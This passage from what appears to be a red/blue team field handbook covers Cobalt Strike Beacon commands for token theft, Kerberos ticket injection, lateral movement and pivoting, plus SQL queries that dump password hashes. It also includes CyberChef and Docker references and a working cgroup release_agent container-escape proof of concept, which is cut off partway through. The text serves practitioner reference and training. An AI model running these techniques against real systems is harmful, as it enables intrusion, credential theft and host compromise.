enable the privileges 
assigned to your current 
access token. 
RECON 
portscan [targets] [ports] 
start the port scanner job 
portscan [targets] arp 
Uses an ARPrequestto discover 
if a host isalive 
portscan [targets] icmp 
sends an ICMP echo request to 
check if a target is alive. 
net dclist 
find the domain controller 
for the domain the target is 
joined to 
net view 
find targets on the domain 
the target is joined to 
56 
net computers 
findstargets by querying 
computer account groups on a 
Domain Controller. 
net localgroup \\TARGET 
list the groups on another 
system. 
net localgroup \\TARGET group 
name 
list the members of a group 
on another system 
TOKENS 
steal_token [process id] 
impersonate a token from an 
existing process 
make_token [DOMAIN\user] 
[password] 
generate a token that passes 
these credentials 
getuid 
print your current token. 
rev2self 
revert back to your original 
token. 
TICKETS 
kerberos_ticket_use 
[/path/to/ticket.kirbi] 
inject a Kerberos ticket into 
the current session.  
kerberos_ticket_purge 
clear any kerberos 
ticketsassociated with your 
session. 
LATERAL MOVEMENT 
jump 
list lateral movement options 
registered with Cobalt 
Strike. 
jump [module] [target] [listener] 
attempt to run a payload on a 
remote target. 
jump psexec [target] [listener] 
Use a service to run a 
Service EXE artifact 
jump psexec64 [target] [listener] 
Use a service to run a 
Service EXE artifact 
jump psexec_psh [target] 
[listener] 
Use a service to run a 
PowerShell one-liner 
jump winrm [target] [listener] 
Run a PowerShell script via 
WinRM 
jump winrm64 [target] [listener] 
Run a PowerShell script via 
WinRM 
remote-exec 
list remote execution modules 
registered with Cobalt 
Strike.  
remote-exec [module] [target] 
[command + args] 
attempt to run the specified 
command on a remote target. 
remote-exec psexec [target] 
[command + args] 
Remote execute via Service 
Control Manager 
remote-exec winrm [target] 
[command + args] 
Remote execute via WinRM 
(PowerShell) 
remote-exec wmi [target] [command 
+ args] 
Remote execute via WMI 
(PowerShell) 
PIVOTING 
57 
socks [PORT]  
start a SOCKS server on the 
given port on your 
teamserver, tunneling traffic 
through the specified Beacon.  
socks stop 
disable the SOCKS proxy 
server. 
browserpivot [pid]  
proxy browser traffic through 
a specified Internet Explorer 
process.  
rportfwd [bind port] [forward 
host] [forward port]  
bind to the specified port on 
the Beacon host, and forward 
any incoming connections to 
the forwarded host and port.  
rportfwd stop [bind port] 
disable the reverse port 
forward. 
SSH SESSIONS 
ssh [target] [user] [password] 
Launch an SSH session from a 
Beacon on Unix targets 
ssh-key [target] [user] 
[/path/to/key.pem] 
Launch an SSH session from a 
Beacon on Unix targets 
shell [cmd + arguments] 
run the command and arguments 
you provide.  
sudo [password] [cmd + arguments] 
attempt to run a command via 
sudo. 
INTEGRATIONS/ENHANCEMENTS 
The Elevate Kit  
An Aggressor Script that integrates several open source privilege 
escalation exploits into Cobalt Strike. 
https://github.com/rsmudge/ElevateKit 
REFERENCE: 
https://www.cobaltstrike.com/downloads/csmanual40.pdf 
https://github.com/HarmJ0y/CheatSheets/blob/master/Beacon.pdf 
https://github.com/threatexpress/cs2modrewrite 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology
%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet.md 
C
C 
CYBER CHEF 
BLUE TEAM 
FORENSICS 
ALL 
CyberChef is a simple, intuitive web app for analyzing and decoding 
data without having to deal with complex tools or programming 
languages. 
58 
Example Scenarios: 
o 
Decode a Base64-encoded string 
o 
Convert a date and time to a different time zone 
o 
Parse a IPv6 address 
o 
Convert data from a hexdump, then decompress 
o 
Decrypt and disassemble shellcode 
o 
Display multiple timestamps as full dates 
o 
Carry out different operations on data of different types 
o 
Use parts of the input as arguments to operations 
o 
Perform AES decryption, extracting the IV from the 
beginning of the cipher stream 
o 
Automatically detect several layers of nested encoding 
DESCRIPTION 
(Win/Linux) 
(Mac) 
Place cursor in 
search field 
Ctrl+Alt+f 
Ctrl+Opt+f 
Place cursor in input 
box 
Ctrl+Alt+i 
Ctrl+Opt+i 
Place cursor in 
output box 
Ctrl+Alt+o 
Ctrl+Opt+o 
Place cursor in first 
argument field of the 
next operation in the 
recipe 
Ctrl+Alt+. 
Ctrl+Opt+. 
Place cursor in first 
argument field of the 
nth operation in the 
recipe 
Ctrl+Alt+[1-9] 
Ctrl+Opt+[1-9] 
Disable current 
operation 
Ctrl+Alt+d 
Ctrl+Opt+d 
Set/clear breakpoint 
Ctrl+Alt+b 
Ctrl+Opt+b 
Bake 
Ctrl+Alt+Space 
Ctrl+Opt+Space 
Step 
Ctrl+Alt+' 
Ctrl+Opt+' 
Clear recipe 
Ctrl+Alt+c 
Ctrl+Opt+c 
Save to file 
Ctrl+Alt+s 
Ctrl+Opt+s 
Load recipe 
Ctrl+Alt+l 
Ctrl+Opt+l 
Move output to input 
Ctrl+Alt+m 
Ctrl+Opt+m 
Create a new tab 
Ctrl+Alt+t 
Ctrl+Opt+t 
Close the current tab 
Ctrl+Alt+w 
Ctrl+Opt+w 
Go to next tab 
Ctrl+Alt+RightAr
row 
Ctrl+Opt+RightAr
row 
Go to previous tab 
Ctrl+Alt+LeftArr
ow 
Ctrl+Opt+LeftArr
ow 
REFERENCE: 
59 
https://gchq.github.io/CyberChef/ 
D 
D
D 
DATABASES 
RED/BLUE TEAM 
ADMINISTRATION 
WINDOWS/LINUX 
MSSQL 
MySQL 
DESCRIPTION 
Version 
SELECT @@version; 
SELECT @@version; 
Current DB 
Name 
SELECT DB_NAME(); 
SELECT database(); 
List users 
SELECT name FROM 
master..syslogins; 
SELECT user FROM 
mysql.user; 
List DB's 
SELECT name FROM 
master..sysdatabases; 
SELECT distinct(db) FROM 
mysql.db; 
List 
Columns 
SELECT table_catalog, 
column_name FROM 
information_schema.colum
ns; 
SHOW columns FROM 
mytable FROM mydb; 
List Tables 
SELECT table_catalog, 
table_name FROM 
information_schema.colum
ns; 
SHOW tables FROM mydb; 
Extract 
Passwords 
SELECT 
SL.name,SL.password_hash 
SELECT User,Password 
FROM mysql.user INTO 
OUTFILE â€˜/tmp/hash.txt'; 
60 
FROM sys.sql_logins AS 
SL; 
ORACLE 
POSTGRES 
Version 
SELECT user FROM dual 
UNION SELECT * FROM 
v$version 
SELECT version(); 
Current DB 
Name 
SELECT global_name FROM 
global_name; 
SELECT 
current_database(); 
List users 
SELECT username FROM 
all_users ORDER BY 
username; 
SELECT username FROM 
pg_user; 
List DB's 
SELECT DISTINCT owner 
FROM all_tables; 
SELECT datname FROM 
pg_database; 
List 
Columns 
SELECT column_name FROM 
all_tab_columns WHERE 
table_name = 'mydb'; 
SELECT column_name FROM 
information_schema.colum
ns WHERE 
table_name='data_table'; 
List Tables 
SELECT table_name FROM 
all_tables; 
SELECT table_name FROM 
information_schema.table
s; 
Extract 
Passwords 
SELECT name, password, 
spare4 FROM 
sys.user$ WHERE 
name=''; 
SELECT username, passwd 
FROM pg_shadow; 
REFERENCE: 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injec
tion 
https://hakin9.org/sql-commands-cheat-sheet-by-cheatography/ 
https://portswigger.net/web-security/sql-injection/cheat-sheet 
D
D 
DEFAULT PASSWORDS 
RED TEAM 
ESCALATE PRIVS 
ALL 
REFER TO REFERENCES BELOW 
REFERENCE 
http://www.critifence.com/default-password-database/ 
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-
Credentials/default-passwords.csv 
https://www.fortypoundhead.com/tools_dpw.asp 
https://default-password.info/ 
D
D 
61 
DOCKER 
RED/BLUE TEAM 
DEVOPS 
WINDOWS/LINUX/MacOS 
COMMAND 
DESCRIPTION 
CONTAINER BASICS 
docker run -p 4000:80 imgname 
Start docker container 
docker run -d -p 4000:80 imgname 
Start docker container 
in detached mode 
docker run -t -d --entrypoint=/bin/sh 
"$docker_image" 
Start container with 
entrypoint changed 
docker exec -it  sh 
Enter a running 
container 
docker cp /tmp/foo.txt 
mycontainer:/foo.txt 
Upload local file to 
container filesystem 
docker cp mycontainer:/foo.txt 
/tmp/foo.txt 
Download container 
file local filesystem 
docker stop  
Stop container 
docker rm  
Remove container 
docker rm $(docker ps -a -q) 
Remove all containers 
docker kill  
Force shutdown of one 
given container 
docker login 
Login to docker hub 
docker tag  username/repo:tag 
Tag  
docker push username/repo:tag 
Docker push a tagged 
image to repo 
docker run username/repo:tag 
Run image from a given 
tag 
docker build -t denny/image:test . 
Create docker image 
DOCKER CLEANUP 
delete-all-containers.sh 
Delete all containers 
delete-unused-images.sh 
Remove unused docker 
images 
docker image prune -f 
Docker prune images 
docker volume prune -f 
Docker prune volumes 
docker rmi  
Remove the specified 
image 
docker rmi $(docker images -q) 
Remove all docker 
images 
docker volume rm $(docker volume ls -qf 
dangling=true) 
Remove orphaned docker 
volumes 
docker rm $(docker ps --filter 
status=dead -qa) 
Remove dead containers 
docker rm $(docker ps --filter 
status=exited -qa) 
Remove exited 
containers 
DOCKERFILE 
entrypoint: ["tail", "-f", "/dev/null"] 
Change entrypoint to 
run nothing 
62 
RUN ln -snf /usr/share/zoneinfo/$TZ 
/etc/localtime && echo $TZ > 
/etc/timezone 
Set timezone in 
Dockerfile 
GitHub: Dockerfile-example-multiline 
Define multiple line 
command 
DOCKER COMPOSE 
restart: always, Link: Compose file 
version 3 reference 
Change restart policy 
$PWD/httpd/httpd.conf:/usr/local/apache2
/conf/httpd.conf:ro GitHub: sample-
mount-file.yml 
Mount file as volume 
docker-compose up, docker-compose up -d 
Start compose env 
docker-compose down, docker-compose down 
-v 
Stop compose env 
docker-compose logs 
Check logs 
DOCKER CONTAINERS 
docker run -p 4000:80 imgname 
Start docker container 
docker run -d -p 4000:80 imgname 
Start docker container 
in detached mode 
docker run -rm -it imgname sh 
Start docker container 
and remove when exit 
docker exec -it [container-id] sh 
Enter a running 
container 
docker stop  
Stop container 
docker ps, docker ps -a 
List all containers 
docker rm , docker rm $(docker ps 
-a -q) 
Remove container 
docker kill  
Force shutdown of one 
given container 
docker login 
Login to docker hub 
docker run username/repo:tag 
Run image from a given 
tag 
docker logs --tail 5 $container_name 
Tail container logs 
docker inspect --format 
'{{.State.Health}}' $container_name 
Check container 
healthcheck status 
docker ps --filter "label=org.label-
schema.group" 
List containers by 
labels 
DOCKER IMAGES 
docker images, docker images -a 
List all images 
docker build -t denny/image: . 
Create docker image 
docker push denny/image: 
Docker push a tagged 
image to repo 
docker history  
Show the history of an 
image 
docker save  > my_img.tar 
Export image to file 
docker load -i my_img.tar 
Load image to local 
registry 
docker tag  username/repo:tag 
Tag  
63 
DOCKER SOCKETFILE 
docker run -v 
/var/run/docker.sock:/var/run/docker.soc
k -it alpine sh 
Run container mounting 
socket file 
export 
DOCKER_HOST=unix:///my/docker.sock 
A different docker 
socket file 
curl -XGET --unix-socket 
/var/run/docker.sock 
http://localhost/containers/json 
List containers 
curl -XPOST --unix-socket 
/var/run/docker.sock 
http://localhost/containers//stop 
Stop container 
curl -XPOST --unix-socket 
/var/run/docker.sock 
http://localhost/containers//start 
Start container 
curl --unix-socket /var/run/docker.sock 
http://localhost/events 
List events 
curl -XPOST --unix-socket 
/var/run/docker.sock -d 
'{"Image":"nginx:alpine"}' -H 'Content-
Type: application/json' 
http://localhost/containers/create 
Create container 
DOCKER CONF 
/var/lib/docker, 
/var/lib/docker/devicemapper/mnt 
Docker files 
~/Library/Containers/com.docker.docker/D
ata/ 
Docker for Mac 
DOCKER STATUS 
docker logs --tail 5 $container_name 
Tail container logs 
docker inspect --format 
'{{.State.Health}}' $container_name 
Check container 
healthcheck status 
docker ps 
List containers 
docker ps -a 
List all containers 
docker ps --filter "label=org.label-
schema.group" 
List containers by 
labels 
docker images -a 
List all images 
REFERENCE: 
https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE/blob/master/8-part-
100-article/62_article/Docker%20for%20Pentesters.pdf 
https://github.com/wsargent/docker-cheat-sheet 
https://github.com/Cugu/awesome-forensics 
https://cheatsheet.dennyzhang.com/cheatsheet-docker-a4 
D
D 
DOCKER_Exploit 
64 
RED TEAM 
EXPLOITATION 
WINDOWS/LINUX 
Docker Secrets Locations 
If you gain access to a Docker container you can check the 
following location for possible plaintext or encoded Docker 
passwords, api_tokens, etc. that the container is using for 
external services. 
You may be able to see Docker secret locations or names by issuing: 
$ docker secret ls 
Depending on the OS your target Docker container is running you can 
check the following locations for secret file locations or mounts. 
Linux Docker Secrets Locations: 
/run/secrets/ 
Windows Docker Secrets Locations: 
C:\ProgramData\Docker\internal\secrets 
C:\ProgramData\Docker\secrets 
Container Escape Abuse Linux cgroup v1: 
# version of the PoC that launches ps on the host  
# spawn a new container to exploit via 
# docker run --rm -it --privileged ubuntu bash 
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)` 
mkdir -p $d/w;echo 1 >$d/w/notify_on_release 
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` 
touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps 
>'"$t/o" >/c; 
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o 
Exploit Refined will execute a ps aux command on the host and save 
its output to the /output file in the container: 
# On the host 
docker run --rm -it --cap-add=SYS_ADMIN --security-opt 
apparmor=unconfined ubuntu bash 
# In the container 
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && 